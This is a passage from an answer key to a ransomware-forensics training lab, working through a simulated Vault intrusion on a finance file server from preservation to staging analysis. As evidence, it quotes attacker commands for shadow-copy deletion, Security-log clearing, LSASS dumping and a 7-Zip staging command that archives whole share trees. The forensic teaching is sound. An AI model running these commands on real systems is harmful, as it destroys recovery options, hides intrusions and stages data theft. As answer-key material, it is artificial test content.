# Lab 12 — Task Answer Key

*Sample answers for the workbook-style Tasks in `Labs/Lab12/ReadMe.md`. These are reference answers, not the only correct ones. A defensible ransomware answer names the evidence, states the confidence tier, and says explicitly what the evidence does not support. For the Hands-On Walkthrough that resolves the case against `Data/ACCT-FS01/`, see `walkthrough-answers.md`.*

> **This lab's central discipline:** three things are true at once, and a good answer keeps all three visible. The evidence for the encryption event is overwhelming. The evidence for the exfiltration is strong but one artifact short of conclusive. The evidence for the *environment-wide* scope barely exists, because everything in this dataset comes from one file server, one jump host, and one domain controller. Flattening those three confidence levels into one confident narrative is the failure mode this case trains against. It is also the failure that gets a client restored into a live intrusion.

---

## Task 1 — Manage the Clocks and Write the Preservation Request

**Part A — the four clocks:**

| Clock | Who sets it | What it pressures you to do | Investigative cost if it wins |
|---|---|---|---|
| Recovery | The business — finance can't work, the infrastructure lead has a 14:00 reimage booked | Reimage now, restore, get the share back | Total loss of disk-resident evidence: MFT, USN, Prefetch, Amcache, SRUM, the registry persistence, the surviving Security log. The case ends |
| Negotiation | The actor — 72 hours at the current price, publication after 168 | Deliver partial answers fast so counsel and any negotiation vendor can act | Rushed scoping numbers that get revised upward later, costing credibility exactly when the recovery assessments need it |
| Notification | Regulation and contract — GDPR's 72 hours from awareness, US state and sector rules | Answer "did they take data?" before you can answer it well | Either an overclaimed exfiltration finding (unnecessary notification, reputational cost) or an underclaimed one (missed statutory deadline) |
| Insurance | The carrier — short notice windows, often a panel of approved vendors | Confirm the engagement and reporting line before doing anything | Working for the wrong client, producing a report that is not privileged, or a coverage dispute |

**Part B — sample preservation request:**

> **To:** Infrastructure lead, Incident commander
> **07:20 UTC — PRESERVATION REQUEST — ACCT-FS01**
>
> Do not reimage, reboot, restart, or restore ACCT-FS01. Do not run cleanup, AV remediation, or backup-agent reinstalls on it.
>
> Before anything else: capture volatile memory while the host is still powered on, then take a full disk image. Estimated 45 minutes for memory and 3 hours for the image with the write blocker already staged. Both can run while you build the replacement server. Preservation does not block your 14:00 return-to-service target on new hardware.
>
> If the host is rebooted, any encryption key material still resident in memory is permanently gone, along with running-process and network-connection state. If it is reimaged, we lose the file-system record of what was staged and taken, which is the evidence base for the data-breach question counsel has already asked.
>
> Please confirm the hold in writing.

**Part C — acquisition order (sample):**

| Item | Order | Why here |
|---|---|---|
| Memory image of `ACCT-FS01` | **1** | It is the only artifact that ceases to exist the moment anyone touches the power button. Chapter 12 §12.6.4 notes that some families leave recoverable key material in memory on a host that has not rebooted. One capture, small cost, irreversible loss if skipped |
| Domain controller Security logs | **2** | They are the backbone of dwell-time analysis and often the only surviving authentication record once hosts have been cleared. They also roll on their own schedule, whatever the recovery team does |
| Disk image of `ACCT-FS01` | 3 | Everything on it is stable as long as the preservation hold holds — but the hold is the thing under pressure |
| Jump host (`JUMP-01`) disk and logs | 4 | The entry point. Also the host a well-meaning admin is most likely to "clean up" |
| Perimeter firewall / VPN logs | 5 | Short retention, independent confirmation of the entry point and the egress |
| EDR telemetry export | 6 | Off-host and out of the actor's reach, but usually retained long enough to collect on day two |
| Backup platform logs and catalog state | 7 | Needed for the backup-viability assessment, not for scoping. The platform team controls it, and it is not going anywhere |

**Part D — the client:** Before you write anything down, establish who engaged you: the company, outside counsel, or the carrier. Outside counsel may attach privilege to your work product. The carrier may dictate scope, vendor, and reporting format. Confirm the answer in writing with the engagement letter or the carrier's assignment. What changes: privilege handling, who receives drafts, whether you can share findings directly with the DPO or regulator, and whether interim verbal updates are appropriate.

**Q1: Why is the memory capture urgent in a way that the disk image is not?**

Memory exists only while the host is powered on. A reboot, a power cycle, or a graceful shutdown destroys it permanently. There is no recovery, no carving, no partial answer. The disk image, by contrast, is stable for as long as the preservation hold survives. The risk to it is administrative, not physical. That difference in failure mode is why memory goes first, even though it is usually the less productive artifact. The specific ransomware payoff is small but real: some families hold key material in memory and do not wipe it, so a capture taken before reboot is occasionally the difference between recovering data and paying for it. The general payoff is larger: running processes, loaded modules, command lines, and the network connection table are invisible to disk forensics.

**Q2: The four clocks conflict. Which conflict is the responder's job to name out loud, and to whom?**

The recovery-versus-preservation conflict. Name it to the incident commander on the first bridge call, before anyone has scheduled a reimage. Recovery wants speed, and forensics can only trade certainty for it. That trade is a business decision, but it is only a decision if someone states it as one. Left unstated, it gets made by default: the fastest path wins, the evidence is destroyed, and nobody realises a choice was made until counsel asks a question that can no longer be answered. Naming the conflict, giving a time estimate for preservation, and asking for an explicit decision is the single highest-value thing a responder does in the first hour.

**Q3: What is lost, specifically and permanently, if `ACCT-FS01` is reimaged at 14:00?**

The MFT and USN Journal, which are the only record of the 418-file encryption event, the staging directory that was deleted at 03:41:22, and the 12 archive volumes whose sizes bound the exfiltration. The surviving Security log: just 24 rows, but they include the 1102 that names the compromised account and the 4688 that proves local execution. Prefetch, Amcache and ShimCache, which are the only evidence that `vssadmin.exe` and `rclone.exe` ran. SRUM, which is the only host-side attribution of 34.35 GiB to a named process. The registry persistence, which is the evidence that a restored host would be reinfected. And memory, which is already gone if the reimage is the first anyone hears of preservation.

---

## Task 2 — Receive the Case and Inventory the Inputs

**Part A — sample inventory answers:**

| Question | Answer |
|---|---|
| Which artifact classes are available? | NTFS (`mft.csv`, `usn-journal.csv`), a derived extension sweep (`encrypted-files-inventory.csv`), event logs across four channels on this host plus two other hosts, execution evidence (`prefetch.csv`, `amcache.csv`, `shimcache.csv`), persistence (`registry-runkeys.csv`), network (`network-flow.csv`), resource usage (`srum.csv`), and three plaintext artifacts. In total, 19 files plus the README |
| Which files came from another host, and why? | `dc-security-evtx.csv` (FINANCE-DC01) and `jumphost-security-evtx.csv` (JUMP-01). They are here because ACCT-FS01 alone cannot answer the backwards chain in Task 9. The actor cleared this host's Security log and did not clear the logs on either of those hosts |
| What is missing? | A **memory image** (never captured — a preservation failure, not a neutral fact); **proxy logs**, which would carry the `rclone/v1.65.0` user agent and per-request byte counts; **backup-platform logs**, needed for the backup-viability assessment; **EDR telemetry**; **perimeter firewall logs**; and any **pre-clear copy of Security.evtx**, which no surviving shadow copy can supply |
| Rows in `security-evtx.csv`, and the first timestamp? | **24 rows**; first record **2024-11-12 02:09:41**, EID **1102** |
| What does that first row tell you? | That the file contains no authentication, process-creation, or share-access history for any part of the six-day dwell window. Everything before 02:09:41 must come from elsewhere. Any "absence" finding drawn from this file is also meaningless unless it applies only to the post-02:09:41 period |

**Part C — the ransom note:**

| Item | Value | Who needs it |
|---|---|---|
| Family / strain | Vault | Threat intel, negotiation vendor, No More Ransom check |
| Extension | `.vaulted` | Your own sweep; the enterprise-wide EDR live query |
| Victim identifier | `VLT-8837-ACCT` | Counsel and the negotiation vendor; also the cross-host consistency check |
| Contact channel | Defanged onion portal | Counsel; nobody visits it without an explicit instruction |
| Claimed exfiltration | 34 GB of accounting, finance, HR and legal data | Counsel — as a *claim*, flagged as such |
| Deadline structure | 72 h current price, 168 h publication | Incident commander; it sets the negotiation clock |

**Q1: What evidentiary weight does the exfiltration claim carry?**

Effectively none on its own. Ransomware crews routinely claim to have taken data they did not take, and occasionally publish samples from unrelated victims to make the claim look credible. The claim is a **lead to verify**, not a finding. In this case the independent evidence happens to agree with the claim: 34.30 GiB staged on disk, 34.75 GiB egressed in flow, and 34.35 GiB attributed to `rclone.exe` in SRUM. The finding rests on those three measurements, not on the note. The direction of inference matters. Your evidence corroborates itself and incidentally matches their claim. Their claim does not validate your evidence.

**Q2: Why preserve one copy of the note as evidence?**

It carries the victim ID, the contact channel, and the family indicators that counsel, the negotiation vendor and threat intelligence all need. It is also the input to family identification, which determines whether a free decryptor exists. And it is the only copy of the actor's own statement of what they claim to have taken, which matters if the claim is later disputed. In practice, hash it, store it outside the encrypted volume, and record where the copy came from. There are 23 other identical copies, and the one you preserve should have a known provenance.

**Q3: Which two items go to threat intelligence in the first hour?**

The extension (`.vaulted`) and the note filename (`RECOVER-YOUR-FILES.txt`), together with a sample encrypted file if you can extract one safely. What you hope to get back is a precise family identification. It tells you whether a public decryptor exists on No More Ransom, whether this crew's decryptor historically works, whether they have a track record of actually publishing, and what other TTPs to hunt for in the environment. All of that is cheap to ask for and occasionally worth the entire ransom.

---

## Task 3 — Map the Kill Chain to Artifacts

**Sample map (nine rows):**

| Stage | Artifact(s) in this dataset | Survived the log clear? | What it proves |
|---|---|---|---|
| Initial access | `jumphost-security-evtx.csv` 4625 ×212 + 4624; `dc-security-evtx.csv` 4776 ×212 | N/A — different hosts, never cleared | An RDP brute force against `svc-backup` from `45.147.230.19` succeeded at 2024-11-06 21:47:22 |
| Persistence | `system-evtx.csv` 7045 (`VaultUpd`, `PSEXESVC`); `registry-runkeys.csv` (Run value, `fDenyTSConnections`) | Yes — System channel and registry both untouched | Re-entry does not require re-exploitation. The 2024-11-11 nightly backup already carries the `VaultUpd` service and the Run value |
| Credential access | `jumphost-security-evtx.csv` 4688 (`comsvcs.dll MiniDump`, `reg save`); `defender-evtx.csv` 1116/1117 naming Mimikatz | Yes — jump host and Defender channel | LSASS was dumped on JUMP-01 at 2024-11-08 01:52:14. A domain admin account appears in the DC log 12 minutes later, at 02:04:18. Defender on ACCT-FS01 quarantined an `l.dmp` from the same technique on 2024-11-09 |
| Discovery | `jumphost-security-evtx.csv` 4688 (`net view`, `nltest`, `whoami`); `prefetch.csv` (`NETSCAN.EXE`, `NLTEST.EXE`); `powershell-evtx.csv` 4104 (`Get-SmbShare`) | Yes | The actor mapped the domain and sized the share data before deciding what to take |
| Lateral movement | `terminalservices-evtx.csv` 1149/21/22/23; `jumphost-security-evtx.csv` 4648; `system-evtx.csv` 7045 `PSEXESVC` | Yes — operational channel | Four interactive sessions on ACCT-FS01 from `10.0.2.28` between 11-09 and 11-12 |
| Collection and staging | `usn-journal.csv` (847 records in the staging window); `mft.csv` (12 volumes, `InUse=False`); `powershell-evtx.csv` 4104 (the 7-Zip command) | Yes — NTFS is untouched by log clearing | The actor archived 36,829,344,563 bytes from five named source trees on 2024-11-11 |
| Exfiltration | `network-flow.csv` (14 sessions); `srum.csv` (3 buckets); `prefetch.csv`/`amcache.csv`/`shimcache.csv` (`rclone.exe`); `rclone-conf-recovered.txt` | Yes | ~34.5 GiB left toward `185.220.101.44` before encryption began |
| Defense evasion | `defender-evtx.csv` 5001/5007/5010; `system-evtx.csv` volsnap 25 ×4; `powershell-evtx.csv` 4104; `prefetch.csv` `VSSADMIN.EXE`; `security-evtx.csv` 1102 | Partly — every 4688 before 02:09:41 was destroyed, but the operational channels survived | Defender off at 02:02:18, shadow copies deleted at 02:06:33, log cleared at 02:09:41 |
| Encryption | `security-evtx.csv` 4688 at 02:13:52; `prefetch.csv` `VAULT.EXE`; `usn-journal.csv` 2,162 records; `mft.csv` 418 `.vaulted` + 24 notes | Yes — it ran *after* the clear | 418 files across 24 directories, locally, as `svc-backup`, 02:14:06 → 03:38:41 |

**Q1: Which stages have evidence only from outside `ACCT-FS01`?**

Initial access, credential access and discovery. All three happened on the jump host, and you could not reconstruct any of them from this file server. The collection lesson for the next case is blunt: **collect from the perimeter host and the domain controllers first, not last.** Chapter 12 §12.2.1 says exactly this, and this dataset shows what it looks like when you get it right. Had the jump host been reimaged before collection, the dwell window would be unknowable and the report would have to say so. That is exactly what would have happened if the recovery clock had won there too.

**Q2: Which artifact class would you least want to lose?**

The USN Journal. It is the only source that carries the *sequence* of the encryption rather than just its end state. It survives log clearing entirely, and it preserves the names and sizes of files the actor deleted. One technique applied to it, per-minute binning, produces both the encryption window and the staging burst four hours earlier. The MFT tells you what is encrypted now. The USN Journal tells you what happened, in what order, including the parts the actor tried to remove.

**Q3: How does the Prefetch caveat change the wording of the local-execution finding?**

The finding cannot lean on Prefetch alone, and the wording should show that it does not. Write it as: *encryption was performed locally on ACCT-FS01, evidenced by a Security 4688 at 02:13:52, a Prefetch entry with RunCount 1, and matching Amcache and ShimCache records, together with the absence of any 5145 share-access volume consistent with remote encryption.* Four independent sources, listed, with the negative evidence stated too. Then add the caveat. A single-run binary on a server may not flush to Prefetch at all, so the *absence* of a Prefetch entry on another host would not by itself indicate remote encryption. The caveat protects the next host you look at more than it protects this one.

---

## Task 4 — Sweep the Encrypted Extension

**Sample results:**

| Measure | Value |
|---|---|
| Encrypted file count | **418** |
| Encrypted data volume | **78,662,133,156 bytes** (73.26 GiB) |
| Affected directories | **24** |
| Highest file count | `C:\Shares\Accounting\AP\Invoices\2024` — 38 files |
| Highest data volume | `C:\Shares\IT\Backups\SQL` — 72,245,603,301 bytes from 5 files |
| Earliest `$SI` Modified | 2024-11-12 02:14:16 |
| Latest `$SI` Modified | 2024-11-12 03:38:37 |

The top five by count and the top three by volume are in `walkthrough-answers.md` Step 2. Places six to eight by count are `C:\Shares\Accounting\Payroll\2024` (24 files, 107,300,250 bytes), `C:\Shares\Accounting\Reconciliation` (22 files, 119,549,594 bytes) and `C:\Shares\Accounting\Archive\2021` (21 files, 1,625,266,025 bytes). The headline number: **five files are 1.2 % of the count and 91.84 % of the volume.**

**Q1: Which ranking does the recovery team need, and which does counsel need?**

The recovery team needs the *volume* ranking. Volume determines restore time, storage provisioning, and the order in which systems come back, and a 67 GiB SQL directory and a 174 MB invoice folder are entirely different operations. Counsel needs the *count and the content*, because notification obligations attach to records and data subjects, not to gigabytes. The 413 accounting, payroll, HR and legal documents drive the notification analysis far more than five database backups do. Both go in the scoping deliverable, side by side, and neither is described as "the" scope.

**Q2: `C:\Shares\Finance\Reports\Archive` has no `.vaulted` files. Two explanations?**

Explanation one: the encryptor's skip list excluded it. That is unlikely, because the directory sits inside an otherwise fully encrypted share and does not resemble the OS and application paths the family skipped (`C:\Windows\`, `C:\Program Files\`, `C:\ProgramData\`). Explanation two: a running process, such as a reporting service holding handles, had the files open and locked, so the encryptor could not overwrite them. The dataset supports the second. The actor stopped SQL and backup services at 02:04:41 but not the reporting service, and the directory's files carry a last-modified time of 2024-11-11 18:42.

The ransom note does not separate the two. The directory has none, but a skipped directory would have none either. In this dataset every note sits in a directory with encrypted files, so you cannot tell whether the family writes its note on entering a directory or only after encrypting something there. If it is the latter, a directory whose files were all locked also gets no note. What does separate them is process and service state: check for anything holding handles on those paths at encryption time. In a real case, `handle.exe` output or an EDR file-handle query at triage time would settle it.

**Q3: Why is every number preliminary?**

Because they describe one host, and the environment has not been swept. The actor held a domain admin credential from 2024-11-08 and reached `BKP-SRV01` on 2024-11-09. Other hosts may be encrypted. Any encrypted network share is encrypted by whichever host mounted it, not by the share's host. For the 09:00 update, phrase it as: *"On ACCT-FS01, 418 files across 24 directories, 73.3 GiB, encrypted between 02:14 and 03:38 UTC. These are host-level figures. An enterprise sweep for the `.vaulted` extension and the ransom-note filename has not yet been completed; the environment-wide figure can only go up."* A number you revise upward later costs credibility you will need when you deliver the recovery assessments.

---

## Task 5 — Establish the Encryption Window from the USN Journal

**Sample results:**

| Measure | Value |
|---|---|
| First bin | 2024-11-12 02:14 |
| Last bin | 2024-11-12 03:38 |
| Duration | 84 min 35 s |
| Records in window | **2,162** |
| Peak in one minute | **30** (02:52, 03:20, 03:23) |
| Lowest inside the window | **2** (03:32) |
| Baseline, 00:14–02:14 | 16 records total, ~0.13/min |

All five signature properties from Chapter 12 §12.3.2 are present. See `walkthrough-answers.md` Step 4 for the evidence of each. The trough runs **03:30–03:36** (9, 4, 2, 4, 4, 3, 4 records/min). The five multi-gigabyte SQL backups in directory 23 of 24 cause it.

**Q1: Why is the USN Journal better than the `$SI` Modified timestamps?**

Because `$SI` timestamps are writable from user space and describe end state, while the journal describes sequence. A family that timestomps its output, and many do, leaves `$SI` Modified values that are worthless for windowing. The USN records are still there with their own timestamps, and an ordinary process cannot rewrite the journal. The journal also carries the reason codes, so it distinguishes "this file was modified" from "this file was overwritten, truncated, and renamed". That distinction is what makes the mass-modification pattern recognisable at all. And it captures files that were deleted afterwards, which `$SI` on a live volume cannot.

**Q2: What would the curve look like with three hosts encrypting over SMB simultaneously?**

Roughly three times the amplitude. More diagnostically, the directory walk order would break down. A single encryptor walks the tree in a deterministic order, so records cluster by directory in sequence. Three concurrent remote encryptors produce interleaved records from three different subtrees at once. The ransom-note `$SI` Born timestamps would no longer form a monotonic traversal. You would also see the corresponding evidence on the destination side: thousands of 5145 records from three source IPs, sustained port-445 flow from three hosts, and no local execution evidence at all. Chapter 12 §12.3.4 covers the pivot.

**Q3: Which conclusions depend on the rate, and which only on the shape?**

Only one conclusion depends on the absolute rate: the claim that the activity is anomalous relative to normal file-server load. Even that is really a ratio, a 0.13/min baseline against a 24–30/min plateau, rather than an absolute number. Everything else depends on shape: the sharp onset and offset that bound the window, the perfect uniformity of the reason codes, the rename pairing, the directory-grouped walk order, and the note-creation triplets at boundaries. That distinction matters because this dataset is deliberately downsampled by two to three orders of magnitude. A real file server produces tens of thousands of records per minute during encryption. Any writeup that quotes the per-minute rates here as representative is wrong. Any writeup that describes the shape is not.

---

## Task 6 — Map the Blast Radius from Ransom-Note Placement

The full 24-row traversal table is in `walkthrough-answers.md` Step 3.

**Q1: What does note placement give you that a per-file sweep does not?**

Three things. First, the *directory list* directly, without deduplicating 418 paths. It includes directories that a per-file sweep would scatter across mapped drives and mounted volumes. Second, the *traversal order*, because the notes' `$SI` Born timestamps are monotonic and reproduce the encryptor's tree walk. Third, the *pace*, from which anomalies fall out. The gap between consecutive notes is a proxy for how long each directory took, so an unusually large gap points at either a very large file set or a very large file.

There is a fourth, less obvious use. If the actor timestomped the encrypted files, the notes' own `$FN` timestamps are usually untouched and give you a window when nothing else does.

**Q2: The largest gap?**

**03:30:12 → 03:37:20**, seven minutes eight seconds, before `C:\Shares\IT\Backups\SQL`. Five database backups of 12.4–18.4 GB each. This is the same event as the histogram trough in Task 5, seen from a different artifact. Reading the two together explains the trough without speculation.

**Q3: A second host with the same note filename but a different victim ID?**

It suggests either separate deployments by the same crew or, more commonly in the affiliate model, two different affiliates operating in the same environment. That in turn implies either a shared initial access broker or two independent compromises. Operationally, it changes the negotiation posture completely. Two identifiers mean two decryptors, two negotiations, and possibly two publication threats. What to do: preserve both notes, and give both identifiers to counsel and the negotiation vendor immediately. Then re-scope on the assumption that the two intrusions may have different entry points, different dwell windows, and different persistence.

**Q4: What does `C:\Users\svc-backup\Documents` in the encrypted set tell you?**

It tells you that the encryptor's directory walk included user profiles, and that the profile it reached last belongs to the account it ran as. That account is `svc-backup`, which is also the account named in the 4688 at 02:13:52 and in the 1102 at 02:09:41. The detail is a small, independent corroboration of the account attribution: the encryptor was running with that profile loaded. It is not proof on its own, so present it as corroboration rather than as a finding. It is still the kind of detail that makes a report read as evidence-led.

---

## Task 7 — Prove Where the Encryption Ran

**Sample table:**

| Evidence | Local predicts | Remote SMB predicts | This dataset shows |
|---|---|---|---|
| 4688 for the encryptor | Present | Absent | **Present** — 02:13:52, `vault.exe -enc -threads 16 …`, as `svc-backup` |
| Prefetch entry | Present (if enabled and flushed) | Absent | **Present** — `VAULT.EXE`, RunCount 1 |
| Amcache / ShimCache | Present | Absent | **Present** — both, `C:\Windows\Temp\vault.exe` |
| Encryptor binary in MFT | Present (possibly `InUse=False`) | Absent | **Present**, `InUse=False`, deleted 03:39:12 |
| 5140 / 5145 volume | Minimal | Thousands of 5145 from one source IP | **1 × 5140, 0 × 5145** |
| Port-445 flow during the window | Minimal | Sustained, from the encrypting host | Two SMB flows, both on 11-09 and 11-11 for tool delivery — none during 02:14–03:38 |

**Conclusion:** encryption was performed locally on ACCT-FS01, by `C:\Windows\Temp\vault.exe`, running as `FINANCE\svc-backup`. **Confidence: HIGH** — four independent local-execution artifacts and the absence of the entire remote-execution signature.

**Q1: Strongest evidence, and its weakness?**

The Security 4688 at 02:13:52, because it carries the full command line. That includes `-ext .vaulted` and `-id VLT-8837-ACCT`, which tie the process directly to the observed file extension and the ransom note. Its weakness is that it exists only by accident of timing: the actor cleared the log at 02:09:41 and ran the encryptor four minutes later. Had the actor cleared the log *after* encrypting instead of before, this record would not exist. The finding would then rest on Prefetch, Amcache and ShimCache. That is a materially weaker set, because none of those carry a command line and ShimCache does not even evidence execution.

**Q2: If Prefetch had been disabled?**

You would still have the 4688 (command line, account, parent process), the Amcache entry (SHA-1, path, size), the ShimCache entry (path presence only), the MFT entry for the binary, and the negative evidence of no 5145 volume. The conclusion survives comfortably on three sources plus the negative. What you would lose is the *run count* and the first/last-run times. Those matter more for the `rclone.exe` analysis in Task 10, where RunCount 3 tells you there were multiple transfer sessions, than for a binary that ran once.

**Q3: What single query would you run first next time?**

Count 5145 records grouped by source IP for the encryption window. If the answer is thousands from one address, you are on the wrong host. Pivot to that address, and do not spend an hour hunting for a binary that was never here. If the answer is near zero, look for local execution evidence. It is one query, it takes seconds, and it is the difference between a productive morning and a wasted one. In this dataset the answer is zero, which is why the local-execution hypothesis is worth pursuing at all.

---

## Task 8 — Reconstruct the Defense-Evasion Sequence

The full 16-step sequence with per-step artifact attribution is in `walkthrough-answers.md` Step 6.

| Measure | Value |
|---|---|
| Real-time protection disabled (Defender 5001, 02:02:18) → first encrypted file | **11 min 48 s** |
| First evasion action, the staging-path exclusion (Defender 5007, 2024-11-11 21:52:41) → first encrypted file | **4 h 21 min 25 s** |
| Log clear → first encrypted file | **4 min 25 s** |
| Account in the 1102 | `svc-backup` |
| Earliest surviving Security record | 2024-11-12 02:09:41 |

**Q1: What two findings does the single 1102 establish?**

First, that `svc-backup` was compromised. A backup service account does not clear a Security log as part of its function. That account's presence in a 1102 is by itself a compromise finding, independent of anything else in the case. Second, that the clearing was deliberate and adversarial rather than administrative housekeeping, because it sits 4 minutes 25 seconds before the first encrypted file. Log clearing is the one act that cannot be hidden, because Windows writes the record of the clearing into the newly empty log. That record carries the account and the time. Treat the 1102 as a finding, and quote both halves of it.

**Q2: Why is the Defender detection "a gift"?**

Because Defender named the actor's tooling before the actor silenced it. The 1116/1117 pairs on 2024-11-09, during the actor's first interactive session on ACCT-FS01, identify `HackTool:Win64/Mimikatz.E` in `C:\Windows\Temp\l.dmp` and `HackTool:Win32/NetworkScanner`. Those detections independently corroborate the credential-access and discovery stages whose 4688 records exist only on the jump host, and they show the LSASS-dump technique being repeated on this host. They also give you two timestamps inside the dwell window, anchored in an artifact class the actor did not clear. And they give you named tool families to hunt for across every other host in the environment. The general lesson: always look *before* the disable, not only at the disable itself. The quarantine records are frequently the best inventory of an actor's toolkit you will get.

**Q3: What does the exclusion-then-disable ordering tell you?**

That a human was managing detection risk rather than a script running end to end. At 21:52 on 2024-11-11 the actor added a narrow Defender exclusion: one path and one process name. That was exactly enough to let `7z.exe` and `rclone.exe` operate without generating alerts, and quiet enough that a SOC watching for "Defender disabled" would see nothing. The actor did not disable real-time protection wholesale until 02:02 the following morning, minutes before encryption. By then detection no longer mattered, because the outcome would be obvious anyway. That is an operator making a cost/benefit judgment twice, four hours apart. It is a small but genuine indicator of human-operated ransomware, which the six-day dwell window then confirms.

**Q4: Three sources a log-clearing actor commonly forgets?**

**Operational event channels.** Defender, TerminalServices, TaskScheduler, WinRM and PowerShell are separate `.evtx` files, and `wevtutil cl Security` does not touch them. Here they contributed the Defender 5001/5007/1116/1117 records and the TerminalServices 1149 records that place the actor's sessions on this host. They also contributed the PowerShell 4104 records that preserved the exact command lines for the Defender disable, the shadow-copy deletion, and the log clear itself.

**Prefetch, Amcache and ShimCache.** Entirely independent of the event log. `VSSADMIN.EXE` with RunCount 2 and LastRun 02:06:33 is the execution evidence for a command whose 4688 was destroyed three minutes later.

**SRUM.** Per-application, per-user bytes sent and received in hourly buckets, in a database the actor has no reason to think about. It is the only host-side source that attributes 34.35 GiB of outbound traffic to `rclone.exe` by name, and it survived both the log clear and the deletion of the staging directory.

A fourth worth naming: the **registry itself**. The Defender policy values, the exclusion path and the Run value are the on-disk residue of the same actions, with their own LastWrite timestamps.

**Q5: What do the four `volsnap` EID 25 records actually establish?**

Read the `Description` field before you cite the event ID. It says *"The shadow copies of volume C: were deleted because the shadow copy storage could not grow in time."* That is Windows describing a **storage-pressure auto-deletion**, the message the OS writes when the diff area runs out of room. It fires on healthy servers under heavy write load. Windows has no dedicated event for deliberate shadow copy deletion. EID 25 is the closest thing available, and it is not the same thing.

What the cluster establishes on its own: the shadow copies on C: were destroyed between 02:06:34 and 02:06:41 on 2024-11-12. That is an outcome, and it is worth a finding.

What has to be paired with it before you can say a command ran: the `VSSADMIN.EXE` Prefetch entry (RunCount 2, LastRun 02:06:33 — one second before the first EID 25) and the PowerShell 4104 record carrying the `vssadmin delete shadows /all /quiet` command line. Those are the execution evidence. The 02:09:41 log clear destroyed the 4688 that would normally carry it. The encryption burst does not begin until 02:13:52, so the ordering, not the event text, rules out the innocent explanation: write pressure from mass encryption starving the diff area.

What the count of four tells you about recovery posture: four snapshots existed on C: before the attack, so the host had a real, if shallow, local rollback capability that the actor destroyed in seven seconds. It also tells you the actor did not need to be clever. A single unelevated-looking command removed every local recovery option the host had. That is the argument for shipping backups off the host, and it is the number to put in front of leadership in the lessons-learned.

---

## Task 9 — Chain Backwards to Patient Zero

**Part A:**

| Question | Answer | Source |
|---|---|---|
| Process | `C:\Windows\Temp\vault.exe` | Security 4688, 02:13:52 |
| Account | `FINANCE\svc-backup` | Same 4688; corroborated by the 1102 and by the encryption of that account's profile |
| Binary arrival | 2024-11-12 02:11:04 | USN `FileCreate`; MFT `$SI` Created |
| Arrival → execution | **2 min 48 s** | 02:11:04 → 02:13:52 |

**Part B — the account's established pattern:** three Kerberos service tickets against `BKP-SRV01`, `BKP-SRV02` and `BKP-SRV03` at 01:05:11, 01:14:12 and 02:23:13 every night from 2024-11-01 — 36 records, no interactive logons, no file-server access, no privilege escalation. **The divergence is 2024-11-06 21:47:22**, the first RemoteInteractive (Type 10) logon that account has ever performed, from an external address.

**Part C — host hops:**

| Hop | From | To | Source-side artifact | Destination-side artifact |
|---|---|---|---|---|
| 1 | ACCT-FS01 | JUMP-01 (`10.0.2.28`) | JUMP-01 4648 explicit-credential events naming `ACCT-FS01` as TargetServerName (11-09, 11-11, 11-12) | ACCT-FS01 TerminalServices 1149 / LSM 21/22/23 with SourceNetworkAddress `10.0.2.28`; System 7045 `PSEXESVC`; DC 4769 for `cifs/acct-fs01` |
| 2 | JUMP-01 | Internet (`45.147.230.19`) | — (external) | JUMP-01 4625 ×212 then 4624 Type 10; DC 4776 ×212 then success |

**Part D:**

| Measure | Value |
|---|---|
| Failed logons | **212** |
| Burst | 2024-11-06 21:03:12 → 21:46:58 (43 min 46 s, ~4.8/min) |
| Success | 2024-11-06 21:47:22 |
| Logon type | 10 (RemoteInteractive) |
| Source IP | `45.147.230.19` |
| Corroboration 1 | DC `dc-security-evtx.csv`: 212 × 4776 with `ErrorCode=0xC000006A`, then one success |
| Corroboration 2 | Absence of a competing explanation — no phishing artifact, no exploited edge appliance, no other unexplained external session in the window |

**Part E — the dwell-window sentence:**

> Earliest observed attacker activity is 2024-11-06 21:03:12 UTC — the first failed logon against `FINANCE\svc-backup` on JUMP-01 from 45.147.230.19. Encryption of ACCT-FS01 completed 2024-11-12 03:38:41 UTC, a six-day dwell. JUMP-01 Security log retention begins 2024-11-04; activity before that date cannot be excluded.

**Q1: The domain admin account?**

`FINANCE\a-mbrennan` first appears in the DC log at **2024-11-08 02:04:18**, requesting a TGT from the jump host's IP. That is 12 minutes after the LSASS dump on that host at 01:52:14, and nine minutes after the `reg save` of SYSTEM at 01:54:58. Its appearance tells you that credential theft succeeded, that the compromise is no longer confined to a service account, and that the blast radius of the *credential* compromise extends well past this file server. The DC log also shows the actor using that account to reach `BKP-SRV01` on 2024-11-09. That is why you cannot answer the backup-trustworthiness assessment in Task 12 optimistically.

**Q2: The sentence that would have saved the team in the field composite?**

*"Earliest observed activity: [date]; log retention begins [date]; earlier activity cannot be excluded."* The team in the composite reported a two-day dwell window that was really the age of their oldest surviving log. The client restored from a three-day-old backup that sat inside the real dwell window, and the environment was reinfected within 48 hours. The sentence costs 13 words. It is the single highest-value piece of report hygiene in ransomware work. It belongs in every dwell-window statement, whether or not you suspect the retention is the binding constraint.

**Q3: Why is the DC Security log the highest-priority collection on day one?**

Because every domain authentication is recorded there as well as on the target host. Actors clear logs on the hosts they touch interactively, but they rarely bother with every domain controller. In this case the DC log turns 212 failures on the jump host from a hypothesis into a confirmed entry point. It carries the account's genuine six-day baseline that makes the divergence legible, and it is the only source that shows the pivot to `a-mbrennan`. It also has its own retention clock that nobody in the recovery effort is thinking about. DC Security logs on a busy domain can roll in days.

---

## Task 10 — Investigate Staging and the Transfer Tool

**Part A:**

| Measure | Value | Source |
|---|---|---|
| Directory created | 2024-11-11 20:58:40, one second before `rclone.exe` was written into it at 20:58:41 | USN `FileCreate` for `wu`, matching the MFT `Created0x10` for the `wu` record. The directory precedes all of its contents |
| Archive volumes | **12** (`acct-fs01-data.7z.001` … `.012`) | MFT, `InUse=False` |
| Total staged bytes | **36,829,344,563** (34.30 GiB) | MFT `FileSize` sum |
| Staging window | 2024-11-11 21:14:22 → 22:37:45 | USN, 847 records across 84 bins |
| Directory deleted | 2024-11-12 03:41:24, after its contents at 03:41:22–03:41:24 | USN `FileDelete\|Close` ×16 for the contents, then one for `wu` |
| Other contents | `rclone.exe`, `rclone.conf`, `7z.exe`, `7z.dll` | MFT, USN |

**Part B — what was actually collected.** The artifact that names the sources is the PowerShell 4104 record at 2024-11-11 21:13:58 carrying the 7-Zip command line:

```
& 'C:\Windows\Temp\wu\7z.exe' a -v3g -mx1 -mhe 'C:\Windows\Temp\wu\acct-fs01-data.7z'
  'C:\Shares\Accounting' 'C:\Shares\Finance' 'C:\Shares\HR' 'C:\Shares\Legal'
  'C:\Shares\IT\Backups\SQL'
```

| Source tree | Encrypted files in that tree | Bytes |
|---|---|---|
| `C:\Shares\Accounting` | 311 | 4,989,521,852 |
